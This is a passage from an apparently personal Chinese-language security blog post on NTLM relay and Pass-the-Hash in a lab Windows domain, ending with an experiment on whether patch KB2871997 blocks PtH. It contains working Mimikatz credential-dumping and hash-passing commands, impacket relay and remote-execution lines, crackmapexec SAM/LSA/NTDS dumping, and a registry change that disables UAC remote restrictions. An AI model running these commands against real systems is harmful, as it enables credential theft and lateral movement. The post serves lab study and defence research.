<p><img src="https://images.atsud0.me/images/post/20220301-13:39:51-_ENmKVA_QST3yO_ENmKVA_1646113191474_ENmKVA_QST3yO.png" alt="https://images.atsud0.me/images/post/20220301-13:39:51-_ENmKVA_QST3yO_ENmKVA_1646113191474_ENmKVA_QST3yO.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220301-13:41:00-_8o1DrI_KJGWiz_8o1DrI_1646113260162_8o1DrI_KJGWiz.png" alt="https://images.atsud0.me/images/post/20220301-13:41:00-_8o1DrI_KJGWiz_8o1DrI_1646113260162_8o1DrI_KJGWiz.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220301-13:42:50-_HYONKH_6iotDa_HYONKH_1646113370857_HYONKH_6iotDa.png" alt="https://images.atsud0.me/images/post/20220301-13:42:50-_HYONKH_6iotDa_HYONKH_1646113370857_HYONKH_6iotDa.png"></p>
<h2 id="探测SMB签名"><a href="#探测SMB签名" class="headerlink" title="探测SMB签名"></a>探测SMB签名</h2><p>可以使用<code>NMAP</code>脚本也可以使用Responder自带的工具.</p>
<h2 id="Responder-MultiRelayx"><a href="#Responder-MultiRelayx" class="headerlink" title="Responder-MultiRelayx"></a>Responder-MultiRelayx</h2><p>利用条件:SMB签名关</p>
<p>第一次使用会提示报错:</p>
<p><img src="https://images.atsud0.me/images/post/20220308-19:34:33-_JDXehi_uzEgR0_JDXehi_1646739273299_JDXehi_uzEgR0.png" alt="20220308-19:34:33-_JDXehi_uzEgR0_JDXehi_1646739273299_JDXehi_uzEgR0"></p>
<p>安装gcc-mingw后,先去Kali Responder tools目录下编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/share/responder/tools \</span><br><span class="line"> sudo x86_64-w64-mingw32-gcc ./MultiRelay/bin/Runas.c -o ./MultiRelay/bin/Runas.exe -municode -lwtsapi32 -luserenv \</span><br><span class="line"> sudo x86_64-w64-mingw32-gcc ./MultiRelay/bin/Syssvc.c -o ./MultiRelay/bin/Syssvc.exe -municode</span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220308-19:35:52-_WljWiL_IDaGcU_WljWiL_1646739352069_WljWiL_IDaGcU.png" alt="20220308-19:35:52-_WljWiL_IDaGcU_WljWiL_1646739352069_WljWiL_IDaGcU"></p>
<h2 id="impacket-smbrelayx"><a href="#impacket-smbrelayx" class="headerlink" title="impacket-smbrelayx"></a>impacket-smbrelayx</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbrelayx -h Client2(伪造服务的IP) -c Command </span><br></pre></td></tr></table></figure>


<p>受害者访问中间人IP(攻击者IP),如果权限足够的话,是能够执行攻击者指定的命令.</p>
<p><img src="https://images.atsud0.me/images/post/20220307-16:50:42-_91GGxW_7j8gqW_91GGxW_1646643042643_91GGxW_7j8gqW.png" alt="20220307-16:50:42-_91GGxW_7j8gqW_91GGxW_1646643042643_91GGxW_7j8gqW"></p>
<p>如果受害人对攻击者要伪造的服务权限不足的话,就会提示权限不足 Like This:</p>
<p><img src="https://images.atsud0.me/images/post/20220307-20:49:23-_0IYudR_image-20220307204923200_0IYudR_1646657363545_0IYudR_image-20220307204923200.png" alt="image-20220307204923200"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-smbrelayx -h 10.1.1.12 -e a.exe #要执行的文件</span><br></pre></td></tr></table></figure>





<p><img src="https://images.atsud0.me/images/post/20220307-21:16:54-_3KQn47_image-20220307211654344_3KQn47_1646659014628_3KQn47_image-20220307211654344.png" alt="image-20220307211654344"></p>
<h2 id="impacket-ntlmrelayx"><a href="#impacket-ntlmrelayx" class="headerlink" title="impacket-ntlmrelayx"></a>impacket-ntlmrelayx</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-ntlmrelayx -t smb://10.1.1.12 -c <span class="built_in">whoami</span> -smb2support</span><br></pre></td></tr></table></figure>


<p>一样的利用方法,诱导受害者访问中间人即可执行命令.</p>
<p><img src="https://images.atsud0.me/images/post/20220308-17:53:57-_Wpdm4t_image-20220308175356939_Wpdm4t_1646733237344_Wpdm4t_image-20220308175356939.png" alt="image-20220308175356939"></p>
<h1 id="0x03-NTLM-Relay-防御"><a href="#0x03-NTLM-Relay-防御" class="headerlink" title="0x03 NTLM Relay 防御"></a>0x03 NTLM Relay 防御</h1><p>【待更新】</p>
<hr>
<h1 id="0x04-Pass-The-Hash"><a href="#0x04-Pass-The-Hash" class="headerlink" title="0x04 Pass The Hash"></a>0x04 Pass The Hash</h1><blockquote>
<p>A Pass-the-Hash (PtH) attack is a technique whereby an attacker captures a password hash (as opposed to the password characters) and then simply passes it through for authentication and potentially lateral access to other networked systems. The threat actor doesn’t need to decrypt the hash to obtain a plain text password. PtH attacks exploit the authentication protocol, as the passwords hash remains static for every session until the password is rotated. Attackers commonly obtain hashes by scraping a system’s active memory and other techniques.</p>
</blockquote>
<blockquote>
<p>While Pass-the-Hash (PtH) attacks can occur on Linux, Unix, and other platforms, they are most prevalent on Windows systems. In Windows, PtH exploits Single Sign-On (SS0) through NT Lan Manager (NTLM), Kerberos, and other authentication protocols. When a password is created in Windows, it is hashed and stored in the Security Accounts Manager (SAM), Local Security Authority Subsystem (LSASS) process memory, the Credential Manager (CredMan) store, a ntds.dit database in Active Directory, or elsewhere. So, when a user logs onto a Windows workstation or server, they essentially leave behind their password credentials.</p>
</blockquote>
<p>PassTheHash 攻击 通常是指 攻击者获得密码hash,利用其对其进行认证 横向至其他网络内部其他系统,攻击者不用解密Hash,因为该攻击方式利用NTLM认证协议.</p>
<p>这里简单介绍下利用方法:</p>
<h2 id="基础利用手法"><a href="#基础利用手法" class="headerlink" title="基础利用手法"></a>基础利用手法</h2><h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#获取内存密码 Or SAM数据库密码</span><br><span class="line">Mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot;</span><br><span class="line">Mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot;</span><br><span class="line"></span><br><span class="line"># 交互式获取shell</span><br><span class="line">Mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /domain:atsud0.lab.com /user:administrator /ntlm:ae4c0d5fb959fda8f4cb1d14a8376af4 /run:cmd.exe&quot;</span><br></pre></td></tr></table></figure>

<h3 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h3><p>impacket套件里面有psexec、wmiexec、atexec、smbexec等工具，其他的用法大致都差不多。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 命令执行 Or 远程登录</span></span><br><span class="line">impacket-wmiexec  -hashes :ae4c0d5fb959fda8f4cb1d14a8376af4 DC01/Administrator@10.1.1.5</span><br><span class="line">impacket-psexec  -hashes :ae4c0d5fb959fda8f4cb1d14a8376af4 DC01/Administrator@10.1.1.5</span><br><span class="line">impacket-smbexec  -hashes :ae4c0d5fb959fda8f4cb1d14a8376af4 DC01/Administrator@10.1.1.5</span><br><span class="line">impacket-dcomexec  -hashes :ae4c0d5fb959fda8f4cb1d14a8376af4 DC01/Administrator@10.1.1.5</span><br><span class="line">impacket-atexec  -hashes :ae4c0d5fb959fda8f4cb1d14a8376af4 DC01/Administrator@10.1.1.5 <span class="string">&quot;whoami&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#导出SAM密码、lsa内存密码</span></span><br><span class="line">impacket-secretsdump  -hashes :35b5a70f68f5ef895d52d15d8d84af6b Administrator@10.1.1.5</span><br></pre></td></tr></table></figure>

<h3 id="crackmapexec"><a href="#crackmapexec" class="headerlink" title="crackmapexec"></a>crackmapexec</h3><p>和impacket比的优点在于，可以很方便的批量攻击多个目标。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#命令执行</span></span><br><span class="line">crackmapexec winrm 10.1.1.2 10.1.1.5 -d atsud0.lab.com -u Administrator -p Admin123456 -x <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.1.1.5 --local-auth -u Administrator -H 35b5a70f68f5ef895d52d15d8d84af6b -x <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.1.1.2 10.1.1.5 -d atsud0.lab.com -u Administrator -H ae4c0d5fb959fda8f4cb1d14a8376af4 -x <span class="built_in">whoami</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#导出密码</span></span><br><span class="line">crackmapexec smb 10.1.1.5 --local-auth -u Administrator -H 35b5a70f68f5ef895d52d15d8d84af6b --sam</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.1.1.5 10.1.1.2 -d atsud0.lab.com -u Administrator -H ae4c0d5fb959fda8f4cb1d14a8376af4 --lsa</span><br><span class="line"></span><br><span class="line">crackmapexec smb 10.1.1.2 10.1.1.5 -d atsud0.lab.com -u Administrator -p Admin123456 --ntds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="探究KB2871997"><a href="#探究KB2871997" class="headerlink" title="探究KB2871997"></a>探究KB2871997</h2><p>本次实验主要是为了弄清楚KB2871997补丁，是否能防御PTH攻击。</p>
<p>实验环境: Windows Server 2008</p>
<p><img src="https://images.atsud0.me/images/post/20220223-11:14:30-_uuGSJx_TcblgI_uuGSJx_1645586070285_uuGSJx_TcblgI.png" alt="https://images.atsud0.me/images/post/20220223-11:14:30-_uuGSJx_TcblgI_uuGSJx_1645586070285_uuGSJx_TcblgI.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220223-11:52:24-_OyLDhL_38qD4k_OyLDhL_1645588344569_OyLDhL_38qD4k.png" alt="https://images.atsud0.me/images/post/20220223-11:52:24-_OyLDhL_38qD4k_OyLDhL_1645588344569_OyLDhL_38qD4k.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220223-11:06:58-_h5KW10_itiVM0_h5KW10_1645585618383_h5KW10_itiVM0.png" alt="https://images.atsud0.me/images/post/20220223-11:06:58-_h5KW10_itiVM0_h5KW10_1645585618383_h5KW10_itiVM0.png"></p>
<p>本地计算机用户中SID为1001的gg用户为普通用户，SID为1002的gga用户为本地计算机管理员用户。</p>
<p>域计算机用户中SID为1104的user用户为普通域用户，SID为1107的sadmin用户为Server01本地计算机管理员的域普通用户。</p>
<h3 id="UAC-Remote-Restrictions"><a href="#UAC-Remote-Restrictions" class="headerlink" title="UAC Remote Restrictions"></a>UAC Remote Restrictions</h3><p>由于Windows Vista后的系统，微软引入了用户帐户控制（User Account Control），为了保护Administrator组的用户，微软默认开启了远程限制（UAC Remote Restrictions），对自建管理员用户的UAC功能进行了限制，远程访问时，自建管理员相当于普通用户。所以只有<strong>SID为500</strong>的Administrator用户能够成功利用PTH，工作组本地其他用户均失败。</p>
<p><img src="https://images.atsud0.me/images/post/20220226-20:31:43-_B0Gv4p_H9dFFu_B0Gv4p_1645878703798_B0Gv4p_H9dFFu.png" alt="https://images.atsud0.me/images/post/20220226-20:31:43-_B0Gv4p_H9dFFu_B0Gv4p_1645878703798_B0Gv4p_H9dFFu.png"></p>
<p>这一点在部分文章中被认为是KB2871997补丁的作用，但是实际上是UAC远程限制(UAC Remote Restrictions)产生的作用，微软官方文档：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction">https://docs.microsoft.com/zh-cn/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction</a></p>
<p>禁用UAC远程限制限制<strong>LocalAccountTokenFilterPolicy。</strong></p>
<p>该项配置默认不存在，不存在的情况下为0。</p>
<p><img src="https://images.atsud0.me/images/post/20220223-11:54:13-_9fWpEM_Aqg0nH_9fWpEM_1645588453856_9fWpEM_Aqg0nH.png" alt="https://images.atsud0.me/images/post/20220223-11:54:13-_9fWpEM_Aqg0nH_9fWpEM_1645588453856_9fWpEM_Aqg0nH.png"></p>
<p>取消限制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v LocalAccountTokenFilterPolicy /t REG_DWORD /d &quot;1&quot; /f</span><br></pre></td></tr></table></figure>

<p>还原配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System&quot; /v LocalAccountTokenFilterPolicy /t REG_DWORD /d &quot;0&quot; /f</span><br></pre></td></tr></table></figure>

<p>该配置修改后立即生效，无须重启。（在开启WinRM的时候，<code>Enable-Psremoting</code>也会把这个远程限制给取消了。）</p>
<h3 id="无补丁-LocalAccountTokenFilterPolicy-默认值"><a href="#无补丁-LocalAccountTokenFilterPolicy-默认值" class="headerlink" title="无补丁+LocalAccountTokenFilterPolicy 默认值"></a>无补丁+<strong>LocalAccountTokenFilterPolicy 默认值</strong></h3><h4 id="本地用户"><a href="#本地用户" class="headerlink" title="本地用户"></a>本地用户</h4><p>SID:500 Administrator 本地计算机管理员</p>
<p><img src="https://images.atsud0.me/images/post/20220223-14:01:45-_rDYgqw_5Ml4yc_rDYgqw_1645596105101_rDYgqw_5Ml4yc.png" alt="https://images.atsud0.me/images/post/20220223-14:01:45-_rDYgqw_5Ml4yc_rDYgqw_1645596105101_rDYgqw_5Ml4yc.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220223-14:14:48-_1rxnDV_1Bdn9i_1rxnDV_1645596888098_1rxnDV_1Bdn9i.png" alt="https://images.atsud0.me/images/post/20220223-14:14:48-_1rxnDV_1Bdn9i_1rxnDV_1645596888098_1rxnDV_1Bdn9i.png"></p>
<p>SID:1001 gg 本地计算机普通用户</p>
<p><img src="https://images.atsud0.me/images/post/20220223-14:17:18-_AwLoGm_OdQOgW_AwLoGm_1645597038108_AwLoGm_OdQOgW.png" alt="https://images.atsud0.me/images/post/20220223-14:17:18-_AwLoGm_OdQOgW_AwLoGm_1645597038108_AwLoGm_OdQOgW.png"></p>
<p>SID:1002 gga 本地计算机管理员用户</p>
<p><img src="https://images.atsud0.me/images/post/20220223-14:20:37-_2FbKCP_RrbfVo_2FbKCP_1645597237604_2FbKCP_RrbfVo.png" alt="https://images.atsud0.me/images/post/20220223-14:20:37-_2FbKCP_RrbfVo_2FbKCP_1645597237604_2FbKCP_RrbfVo.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220223-14:21:38-_vkCwLK_aRWOK1_vkCwLK_1645597298581_vkCwLK_aRWOK1.png" alt="https://images.atsud0.me/images/post/20220223-14:21:38-_vkCwLK_aRWOK1_vkCwLK_1645597298581_vkCwLK_aRWOK1.png"></p>
<h4 id="域内用户"><a href="#域内用户" class="headerlink" title="域内用户"></a>域内用户</h4><p>SID:500 Administrator 域计算机管理员</p>
<p><img src="https://images.atsud0.me/images/post/20220223-14:30:03-_WVHfVR_HIyWEi_WVHfVR_1645597803807_WVHfVR_HIyWEi.png" alt="https://images.atsud0.me/images/post/20220223-14:30:03-_WVHfVR_HIyWEi_WVHfVR_1645597803807_WVHfVR_HIyWEi.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220223-14:40:30-_sjeuSi_OfCGzg_sjeuSi_1645598430237_sjeuSi_OfCGzg.png" alt="https://images.atsud0.me/images/post/20220223-14:40:30-_sjeuSi_OfCGzg_sjeuSi_1645598430237_sjeuSi_OfCGzg.png"></p>
<p>SID:1104 user 域内普通用户</p>
<p><img src="https://images.atsud0.me/images/post/20220223-14:42:02-_9dBQjY_djADeZ_9dBQjY_1645598522588_9dBQjY_djADeZ.png" alt="https://images.atsud0.me/images/post/20220223-14:42:02-_9dBQjY_djADeZ_9dBQjY_1645598522588_9dBQjY_djADeZ.png"></p>
<p>SID:1107 sadmin 加入Server01本地计算机管理员组的普通域用户</p>
<p><img src="https://images.atsud0.me/images/post/20220223-14:44:46-_FAEyEX_K1rU6x_FAEyEX_1645598686700_FAEyEX_K1rU6x.png" alt="https://images.atsud0.me/images/post/20220223-14:44:46-_FAEyEX_K1rU6x_FAEyEX_1645598686700_FAEyEX_K1rU6x.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220223-14:43:29-_GHCGQE_atq51U_GHCGQE_1645598609818_GHCGQE_atq51U.png" alt="https://images.atsud0.me/images/post/20220223-14:43:29-_GHCGQE_atq51U_GHCGQE_1645598609818_GHCGQE_atq51U.png"></p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>在无打补丁的情况下，并且LocalAccountTokenFilterPolicy为默认配置的情况下（注意sadmin为本地计算机管理员的普通域用户）：</p>
<p><img src="https://images.atsud0.me/images/post/20220223-16:21:04-_4JvAah_9lAQ9c_4JvAah_1645604464237_4JvAah_9lAQ9c.png" alt="https://images.atsud0.me/images/post/20220223-16:21:04-_4JvAah_9lAQ9c_4JvAah_1645604464237_4JvAah_9lAQ9c.png"></p>
<h3 id="无打补丁LocalAccountTokenFilterPolicy配置为1"><a href="#无打补丁LocalAccountTokenFilterPolicy配置为1" class="headerlink" title="无打补丁LocalAccountTokenFilterPolicy配置为1"></a>无打补丁LocalAccountTokenFilterPolicy配置为1</h3><h4 id="本地用户-1"><a href="#本地用户-1" class="headerlink" title="本地用户"></a>本地用户</h4><p>SID:500 Administrator 本地计算机管理员用户</p>
<p><img src="https://images.atsud0.me/images/post/20220223-16:18:25-_9aal6d_vK8Y8J_9aal6d_1645604305345_9aal6d_vK8Y8J.png" alt="https://images.atsud0.me/images/post/20220223-16:18:25-_9aal6d_vK8Y8J_9aal6d_1645604305345_9aal6d_vK8Y8J.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220223-16:16:21-_SCeLWy_CaayLJ_SCeLWy_1645604181042_SCeLWy_CaayLJ.png" alt="https://images.atsud0.me/images/post/20220223-16:16:21-_SCeLWy_CaayLJ_SCeLWy_1645604181042_SCeLWy_CaayLJ.png"></p>
<p>SID:1001 gg 本地计算机普通用户</p>
<p><img src="https://images.atsud0.me/images/post/20220223-16:14:01-_HWvZzs_XpSt0V_HWvZzs_1645604041132_HWvZzs_XpSt0V.png" alt="https://images.atsud0.me/images/post/20220223-16:14:01-_HWvZzs_XpSt0V_HWvZzs_1645604041132_HWvZzs_XpSt0V.png"></p>
<p>SID:1002 gga 本地计算机管理员用户</p>
<p><img src="https://images.atsud0.me/images/post/20220223-16:17:39-_AD86UZ_6u9h4g_AD86UZ_1645604259624_AD86UZ_6u9h4g.png" alt="https://images.atsud0.me/images/post/20220223-16:17:39-_AD86UZ_6u9h4g_AD86UZ_1645604259624_AD86UZ_6u9h4g.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220223-16:12:24-_1eGT4M_OngXDO_1eGT4M_1645603944944_1eGT4M_OngXDO.png" alt="https://images.atsud0.me/images/post/20220223-16:12:24-_1eGT4M_OngXDO_1eGT4M_1645603944944_1eGT4M_OngXDO.png"></p>
<h4 id="域用户"><a href="#域用户" class="headerlink" title="域用户"></a>域用户</h4><p>结果与LocalAccountTokenFilterPolicy默认配置的情况相同，在此不再赘述。</p>
<h4 id="小结-1"><a href="#小结-1" class="headerlink" title="小结"></a>小结</h4><p>在无打补丁的情况下，并且LocalAccountTokenFilterPolicy值被修改为1的情况下（注意sadmin为本地计算机管理员的普通域用户）：</p>
<p><img src="https://images.atsud0.me/images/post/20220223-16:34:00-_uO1uvD_DjMo9W_uO1uvD_1645605240497_uO1uvD_DjMo9W.png" alt="https://images.atsud0.me/images/post/20220223-16:34:00-_uO1uvD_DjMo9W_uO1uvD_1645605240497_uO1uvD_DjMo9W.png"></p>
<h3 id="无补丁情况总结"><a href="#无补丁情况总结" class="headerlink" title="无补丁情况总结"></a>无补丁情况总结</h3><p>在不打补丁的情况下，域内用户不受Remote UAC限制，但本地计算机管理员用户受此限制（除了SID为500的Administrator不受限制）。说人话就是，本地计算机管理员不能PTH，除了SID为500的管理员用户。</p>
<h3 id="打了补丁KB2871997且LocalAccountTokenFilterPolicy为默认"><a href="#打了补丁KB2871997且LocalAccountTokenFilterPolicy为默认" class="headerlink" title="打了补丁KB2871997且LocalAccountTokenFilterPolicy为默认"></a>打了补丁KB2871997且LocalAccountTokenFilterPolicy为默认</h3><p><img src="https://images.atsud0.me/images/post/20220223-17:18:02-_hT7S6x_pkiwcG_hT7S6x_1645607882804_hT7S6x_pkiwcG.png" alt="https://images.atsud0.me/images/post/20220223-17:18:02-_hT7S6x_pkiwcG_hT7S6x_1645607882804_hT7S6x_pkiwcG.png"></p>
<p>进行更新KB2871997后进行PTH尝试。</p>
<h4 id="本地用户-2"><a href="#本地用户-2" class="headerlink" title="本地用户"></a>本地用户</h4><p>SID 500 Administrator</p>
<p><img src="https://images.atsud0.me/images/post/20220225-13:56:42-_3p5fyE_OB6TfS_3p5fyE_1645768602510_3p5fyE_OB6TfS.png" alt="https://images.atsud0.me/images/post/20220225-13:56:42-_3p5fyE_OB6TfS_3p5fyE_1645768602510_3p5fyE_OB6TfS.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220225-14:18:51-_QowPX0_60AQgz_QowPX0_1645769931277_QowPX0_60AQgz.png" alt="https://images.atsud0.me/images/post/20220225-14:18:51-_QowPX0_60AQgz_QowPX0_1645769931277_QowPX0_60AQgz.png"></p>
<p>SID 1001 gg 普通用户、SID 1002 gga 本地计算机管理员用户 权限被拒绝</p>
<p><img src="https://images.atsud0.me/images/post/20220225-13:59:33-_gwVa47_EOl4Cn_gwVa47_1645768773076_gwVa47_EOl4Cn.png" alt="https://images.atsud0.me/images/post/20220225-13:59:33-_gwVa47_EOl4Cn_gwVa47_1645768773076_gwVa47_EOl4Cn.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220225-14:39:19-_uu0tbY_859diX_uu0tbY_1645771159019_uu0tbY_859diX.png" alt="https://images.atsud0.me/images/post/20220225-14:39:19-_uu0tbY_859diX_uu0tbY_1645771159019_uu0tbY_859diX.png"></p>
<h4 id="域用户-1"><a href="#域用户-1" class="headerlink" title="域用户"></a>域用户</h4><p>SID 500 Administrator</p>
<p><img src="https://images.atsud0.me/images/post/20220225-14:21:18-_73yxaV_nJfQ53_73yxaV_1645770078796_73yxaV_nJfQ53.png" alt="https://images.atsud0.me/images/post/20220225-14:21:18-_73yxaV_nJfQ53_73yxaV_1645770078796_73yxaV_nJfQ53.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220225-14:26:20-_JHfvCw_XYvMYe_JHfvCw_1645770380922_JHfvCw_XYvMYe.png" alt="https://images.atsud0.me/images/post/20220225-14:26:20-_JHfvCw_XYvMYe_JHfvCw_1645770380922_JHfvCw_XYvMYe.png"></p>
<p>SID 1007 sadmin 域普通用户，本地计算机管理员</p>
<p><img src="https://images.atsud0.me/images/post/20220225-14:29:05-_QHAFTL_Brqlgh_QHAFTL_1645770545939_QHAFTL_Brqlgh.png" alt="https://images.atsud0.me/images/post/20220225-14:29:05-_QHAFTL_Brqlgh_QHAFTL_1645770545939_QHAFTL_Brqlgh.png"></p>
<p>SID 1004 user 域普通用户</p>
<p><img src="https://images.atsud0.me/images/post/20220225-14:31:40-_Ts2m2d_MZcF1j_Ts2m2d_1645770700687_Ts2m2d_MZcF1j.png" alt="https://images.atsud0.me/images/post/20220225-14:31:40-_Ts2m2d_MZcF1j_Ts2m2d_1645770700687_Ts2m2d_MZcF1j.png"></p>
<h4 id="小结-2"><a href="#小结-2" class="headerlink" title="小结"></a>小结</h4><p>在打了补丁KB2871997后，利用PTH攻击的情况：</p>
<p><img src="https://images.atsud0.me/images/post/20220225-14:40:21-_imzxIA_ZUZSG1_imzxIA_1645771221454_imzxIA_ZUZSG1.png" alt="https://images.atsud0.me/images/post/20220225-14:40:21-_imzxIA_ZUZSG1_imzxIA_1645771221454_imzxIA_ZUZSG1.png"></p>
<p>可以发现其实和不打补丁是没有什么区别的，那么这个补丁的作用是什么呢？为什么该补丁又会被称为PTH杀手呢，抱着这个疑问再度进行了一些查找。发现该补丁其实是做了以下保护措施：</p>
<ul>
<li>用户注销后（大概30-40秒左右）清除LSASS的明文凭证。</li>
<li>添加新的SID。</li>
<li>添加受保护的用户组（（仅限域功能级别为Windows Server 2012 R2以上的域控）在该用户组的用户将禁用NTLM、CredSSP、摘要式身份验证、仅支持Kerberos认证（AES或更高），不支持约束委托和不受约束委托）。</li>
<li>RestrictedAdmin RDP模式的远程桌面客户端支持。</li>
</ul>
<p>注销用户后抓取内存密码</p>
<p><img src="https://images.atsud0.me/images/post/20220225-15:43:44-_CGXYRW_c4t5Sm_CGXYRW_1645775024400_CGXYRW_c4t5Sm.png" alt="https://images.atsud0.me/images/post/20220225-15:43:44-_CGXYRW_c4t5Sm_CGXYRW_1645775024400_CGXYRW_c4t5Sm.png"></p>
<p>用户登录状态抓取内存密码</p>
<p><img src="https://images.atsud0.me/images/post/20220225-15:44:51-_PGiC36_V9HBYR_PGiC36_1645775091966_PGiC36_V9HBYR.png" alt="https://images.atsud0.me/images/post/20220225-15:44:51-_PGiC36_V9HBYR_PGiC36_1645775091966_PGiC36_V9HBYR.png"></p>
<p>受保护的用户：</p>
<p>将域用户sadmin添加到受保护的用户组里</p>
<p><img src="https://images.atsud0.me/images/post/20220225-15:49:49-_k2JJoS_HiLvfd_k2JJoS_1645775389882_k2JJoS_HiLvfd.png" alt="https://images.atsud0.me/images/post/20220225-15:49:49-_k2JJoS_HiLvfd_k2JJoS_1645775389882_k2JJoS_HiLvfd.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220225-15:50:39-_wLK2tt_JQhiiy_wLK2tt_1645775439066_wLK2tt_JQhiiy.png" alt="https://images.atsud0.me/images/post/20220225-15:50:39-_wLK2tt_JQhiiy_wLK2tt_1645775439066_wLK2tt_JQhiiy.png"></p>
<p>再次利用smbexec和mimikatz进行PTH攻击</p>
<p><img src="https://images.atsud0.me/images/post/20220225-15:51:11-_kzrBRP_Qqk1ci_kzrBRP_1645775471062_kzrBRP_Qqk1ci.png" alt="https://images.atsud0.me/images/post/20220225-15:51:11-_kzrBRP_Qqk1ci_kzrBRP_1645775471062_kzrBRP_Qqk1ci.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220225-15:52:49-_iosR88_w8AIOD_iosR88_1645775569218_iosR88_w8AIOD.png" alt="https://images.atsud0.me/images/post/20220225-15:52:49-_iosR88_w8AIOD_iosR88_1645775569218_iosR88_w8AIOD.png"></p>
<p>即使用户在登录状态也无法获取NTLM哈希、明文凭据（因为直接禁用NTLM认证）。</p>
<p><img src="https://images.atsud0.me/images/post/20220225-16:11:36-_O9sZEu_rPz3jl_O9sZEu_1645776696426_O9sZEu_rPz3jl.png" alt="https://images.atsud0.me/images/post/20220225-16:11:36-_O9sZEu_rPz3jl_O9sZEu_1645776696426_O9sZEu_rPz3jl.png"></p>
<p>尝试利用ntlm hash进行kerberos认证：</p>
<p><img src="https://images.atsud0.me/images/post/20220321-16:03:44-_XWI9Cd_image-20220321160344378_XWI9Cd_1647849824909_XWI9Cd_image-20220321160344378.png" alt="image-20220321160344378"></p>
<p>继续尝试利用RC4、Aes256进行key传递。</p>
<p><img src="https://images.atsud0.me/images/post/20220225-18:29:57-_oN9DmG_Tku7V2_oN9DmG_1645784997872_oN9DmG_Tku7V2.png" alt="https://images.atsud0.me/images/post/20220225-18:29:57-_oN9DmG_Tku7V2_oN9DmG_1645784997872_oN9DmG_Tku7V2.png"></p>
<p><img src="https://images.atsud0.me/images/post/20220225-18:33:14-_scUT3g_pMDq9W_scUT3g_1645785194043_scUT3g_pMDq9W.png" alt="https://images.atsud0.me/images/post/20220225-18:33:14-_scUT3g_pMDq9W_scUT3g_1645785194043_scUT3g_pMDq9W.png"></p>
<ul>
<li>如果使用aeskey传递的话，得使用 \网络名\ 而不是 \IP地址\ 如果使用\IP地址\的话 会报用户密码错误。</li>
</ul>
<p>在加入受限用户组后，也确实如同补丁描述所说，只允许AesKey进行传递。并且在抓取用户内存密码上变得更加困难，比如。。ekeys都获取不到受限用户组用户的key了。</p>
<p><img src="https://images.atsud0.me/images/post/20220225-19:01:47-_Lo1hmA_rEa7NB_Lo1hmA_1645786907036_Lo1hmA_rEa7NB.png" alt="https://images.atsud0.me/images/post/20220225-19:01:47-_Lo1hmA_rEa7NB_Lo1hmA_1645786907036_Lo1hmA_rEa7NB.png"></p>
